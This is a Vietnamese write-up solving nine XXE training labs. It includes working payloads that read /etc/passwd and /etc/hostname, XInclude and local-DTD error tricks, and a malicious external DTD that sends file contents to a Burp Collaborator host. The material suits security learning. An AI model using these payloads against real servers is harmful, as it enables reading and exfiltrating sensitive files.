# XXE (hay còn gọi là XML external entity)

> Tấn công XML external entity là một kiểu tấn công chống lại một ứng  dụng phân tích cú pháp đầu vào XML và cho phép các thực thể XML.  Các  thực thể XML có thể được sử dụng để yêu cầu trình phân tích cú pháp XML  tìm nạp nội dung cụ thể trên máy chủ.

Trước tiên cần phân biệt internal entity và external entity:

**internal entity**: Nếu một entity được khai báo bên trong DTD thì nó được gọi là internal entity

> Syntax:  `<!ENTITY entity_name "entity_value">`

**external entity**: Nếu một entity được khai báo ngoài DTD thì nó được gọi là external entity

> Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`

----

**Các lab đã solve**

![image-20220522163158441](https://user-images.githubusercontent.com/68894302/169690365-720fb6c1-d20a-43e4-84b6-3ad5bd9c2e75.png)


## Lab 1: Exploiting XXE using external entities to retrieve files

Trang web có chức năng kiểm tra kho và trả về kết quả số lượng còn trong phản hồi. 

Dùng external entity để đọc nội dung `file:///etc/passwd`

![image-20220522163552626](https://user-images.githubusercontent.com/68894302/169690379-69009e02-fb8d-4285-a28b-1115130796af.png)



---

## Lab 2: Exploiting XXE to perform SSRF attacks

Description: 

![image-20220522163552626](https://user-images.githubusercontent.com/68894302/169690397-ea1c0b3b-0ec2-4b39-95b0-846e614a5a9f.png)



Như vậy là phần description đã cho chúng ta địa chỉ ip của server. Bây giờ chỉ việc dùng kĩ thuật XXE kết hợp SSRF để retrieve file

![image-20220522165145270](https://user-images.githubusercontent.com/68894302/169690412-15e751c7-0adf-4d42-afc8-22a37ffd08c9.png)

Đến cuối cùng ta được:

![image-20220522165301818](https://user-images.githubusercontent.com/68894302/169690420-f683e761-82ff-4f6b-98df-5df30b14b669.png)




---

## Lab 3: Blind XXE with out-of-band interaction

Vì là blind XXE nên chúng ta không thể xem trực tiếp kết quả trong phản hồi. Trong trường hợp này dùng kĩ thuật OOB để tương tác với máy chủ qua DNS

![image-20220522170623659](https://user-images.githubusercontent.com/68894302/169690426-128bf876-4c50-4a4b-9926-3bd1fe4e640d.png)


Sau khi poll kết qả trả về trong một yêu cầu http

![image-20220522170702608](https://user-images.githubusercontent.com/68894302/169690434-a9f7b988-8c1f-4690-b762-1cd6efcc6d11.png)




---

## Lab 4: Blind XXE with out-of-band interaction via XML parameter entities

Trong challenge này một số entities đã bị chặn có thể để tránh cuộc tấn công XXE, kiểm tra các giá trị. Thông thường một cuộc tấn công XXE DTD có dạng như sau

```xml-dtd
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com"> ]>
<stockCheck>
	&xxe;
</stockCheck>
```

Giá trị `&xxe;` bị chặn nên trường hợp này có thể sử dụng các thực thể XML đặc biệt để tham chiếu đến những nơi khác trong DTD, đầu tiên khai báo một thực thể tham số XML bao gồm kí tự `%` trước tên thực thể

```xml
<!ENTITY % param "my param entity value"
```

Và các thực thể tham số được tham chiếu trực tiếp bằng kí tự `%` thay vì kí tự `&`

```
%param;
```

Từ đó có thể kiểm tra blind XXE bằng cách kích hoạt ngoài băng

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://fbu05falxlpel9gysa0wc85ksby1mq.burpcollaborator.net"> %xxe; ]>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

![image-20220521073935172](https://user-images.githubusercontent.com/68894302/169690454-4086e049-fb5a-4283-a428-24fdda1f9080.png)


---

### Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD

Thử thách này chúng ta sẽ khai thác lỗ hổng XXE bằng cách lưu trữ file DTD trên server mà chúng ta kiểm soát, sau đó gọi external DTD từ bên trong payload XXE in-band

DTD độc hại để lấy nội dung file /etc/hostname như sau

``` xml-dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://nmdcrtud1mhhvfp9ba4fu8brmis8gx.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

DTD thực hiện các bước như sau:

+ Xác định một thực được gọi là `file`, chứa nội dung file /etc/hostname
+ Định nghĩa một thực thể XML được gọi là `eval` chứa một khai báo động của một thực thể tham số XML khác được gọi là `exfiltrate`
+ Thực thể exfiltrate sẽ được đánh giá bằng cách thực hiện một yêu cầu HTTP đến máy chủ web của attacker có chứa giá trị của file trong chuỗi truy vấn URL
+ Sử dụng thực thể eval, thực thể này khiến việc khai báo động của thực thể exfiltrate được thực hiện
+ Sử dụng thực thể exfiltrate để giá trị của nó được đánh giá bằng yêu cầu URL

Sau đó lưu trữ DTD trên server exploit mà ứng dụng cung cấp, thông thường bằng cách tải lên máy chủ web của chúng ta

![image-20220521084322360](https://user-images.githubusercontent.com/68894302/169690462-56621fa6-c692-4a39-b6b2-d4d26101d583.png)

Sau đó gửi payload XXE trong POST /product/stock để thực thi XXE

![image-20220521084529996](https://user-images.githubusercontent.com/68894302/169690470-355889c5-1bca-4fb2-b3c6-bb884ca53e30.png)

Payload XXE này khai báo một thực thể tham số XML được gọi là `xxe` và sau đó sử dụng thực thể trong DTD. Nó sẽ khiến cho trình phân tích cú pháp của XML fetch cái external DTD được thực thi và file /etc/hostname được truyền đến máy chủ của chúng ta.

![image-20220521084750480](https://user-images.githubusercontent.com/68894302/169690476-83c5089a-5a8b-49ce-9485-e30ffa15b79d.png)



----

## Lab 6: Exploiting blind XXE to retrieve data via error messages

Bài này cách khai thác tương tự như lab bên trên (Exploiting blind XXE to exfiltrate data using a malicious external DTD). Nhưng lần này chúng ta sẽ lợi dụng việc không tồn tại của một file trong hệ thống từ đó cho thấy phản hồi lỗi được trả lại có bao gồm việc thực thi thực thể XML

![image-20220521091343557](https://user-images.githubusercontent.com/68894302/169690549-7246428e-029c-49db-8d16-aff9c9973bcd.png)



Sau đó gọi external DTD  sẽ dẫn đến thông báo lỗi như sau

![image-20220521091519397](https://user-images.githubusercontent.com/68894302/169690554-033f6243-267f-4db6-923d-5237e84bcd41.png)



-------

## Lab 7: Exploiting XInclude to retrieve files

Khi không thể sửa phần tử DOCTYPE chúng ta có thể dùng xinclude để thực hiện XXE. 

```xml-dtd
<test xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></test>
```

![image-20220522111243444](https://user-images.githubusercontent.com/68894302/169690568-d48e0eea-78f8-42f8-b3ea-4fbb1cab1d33.png)



---

## Lab 8: Exploiting XXE via image file upload

Trang web có chức năng tải lên hình ảnh trong phần comment. Có vẻ như nó có thể tải lên định dạng svg. 

File SVG là một tài liệu XML có các thẻ đồ họa và XML có thể được định  dạng sang SVG với định nghĩa XSL. Vì nó xác định đồ họa ở định dạng XML  nên các tệp này tạo ra rất nhiều tình huống tấn công giống như chúng ta  có thể thực thi xss bằng cách sử dụng file svg. 

Ví dụ về một chương trình  hello world đơn giản bằng svg

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg>
<svg width="220px" height="120px"  xmlns="http://www.w3.org/2000/svg">
    <g>
        <text font-size="32"  x="25" y="60">
           Hello, World!
        </text>
    </g>
</svg>  
```

Ứng dụng cho phép người dùng tải lên hình ảnh và xử lý hoặc xác thực những hình ảnh này trên máy chủ sau khi chúng được tải lên như kiểm tra kích thước, loại file... Nhưng ngay khi ứng dụng chỉ cho phép tải định dạng png, jpeg thì thư viện xử lí hình ảnh có thể hỗ trợ cả hình ảnh svg. Vì định dạng SVG sử dụng XML nên chúng ta có thể dễ dàng tấn công xxe

![image-20220522113739821](https://user-images.githubusercontent.com/68894302/169690575-9e08d064-c372-453d-aa8b-547c185bb668.png)

Sau khi upload thành công, nội dung file /etc/hostname đã được nhúng vào hình ảnh

![image-20220522113901323](https://user-images.githubusercontent.com/68894302/169690580-b40a0b08-4f3c-4dde-804c-9ff1acbf8d4f.png)



---

## Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD

Description: 

``` 
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
You'll need to reference an existing DTD file on the server and redefine an entity from it.
Hint

Note: Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.

```

Ban đầu xác định xem file /usr/share/yelp có tồn tại không bằng cách thử các payload sau:

![image-20220522124859395](https://user-images.githubusercontent.com/68894302/169690585-c1bdb1f7-2ca0-48be-907f-89c42579a549.png)

-> không tồn tại file .../docbookx.txt

![image-20220522125000942](https://user-images.githubusercontent.com/68894302/169690588-69ba4718-b56d-4167-81f4-19c6a1dd1058.png)

-> tồn tại file .../docbookx.dtd

Challenge này kết nối không thể thực hiên được từ ứng dụng web. Quan sát thấy DNS thậm chí có thể không phân giải bên ngoài external với payload này

``` xml-dtd
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://3lpwlco92m73t3nom1rod7yjbah05p.burpcollaborator.net'>]>
<root>&test;</root>
```

![image-20220522125717312](https://user-images.githubusercontent.com/68894302/169690593-a335c001-99b4-4ba5-adb1-bcd7c8e130e0.png)

Khả năng lọc dữ liệu dựa trên thông báo lỗi phản hồi chúng ta có thể dựa vào một local DTD để thực hiện các kĩ thuật concatenation. Dùng payload dưới đây để xác định thông báo lỗi bao gồm tệp

```xml-dtd
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///non_exist_file/"> %local_dtd;]>
<root></root>
```

![image-20220522130232540](https://user-images.githubusercontent.com/68894302/169690595-4e8359e0-74d8-43e5-b9f7-7f334fb8b9c8.png)

Như description đã cho chúng ta có một DTD đã có sẵn trên máy chủ là `file:///usr/share/yelp/dtd/docbookx.dtd`. Search google thì thấy rằng hầu hết các máy tính window và linux đều có một DTD công khai

Chọn một thực thể của DTD và xác định cấu trúc của nó và cố tình gây ra lỗi trong đó để đưa phản hồi lỗi đó vào phản hồi của máy chủ cùng với payload ở dạng như dưới đây:

```xml-dtd
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:////etc/hostname">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<root></root>
```

Trông có vẻ hơi phức tạp, luồng hoạt động của nó như sau:

1. File DTD đã được load trong biến `local_dtd`

2. Chúng ta có một thực thể DTD có tên là `custom_entity`

3. Thay đổi nội dung của `custom_entity` này bằng cách tạo động một thực thể `file` để tải nội dung của /etc/passwd
4. Tạo thực thể error trong thực thể eval để gây ra lỗi

Mọi thứ đều mã hóa html vì tất cả đều nằm trong định nghĩa của custom_entity. Các thực thể bên trong custom_entity tương tự như khi XXE với mã thông báo như phần trước chỉ khác là một định nghĩa của custom_entity và html được mã hóa.

![image-20220522162505824](https://user-images.githubusercontent.com/68894302/169690602-3b9d2307-fe4b-48ea-bd68-1d87c604a71e.png)
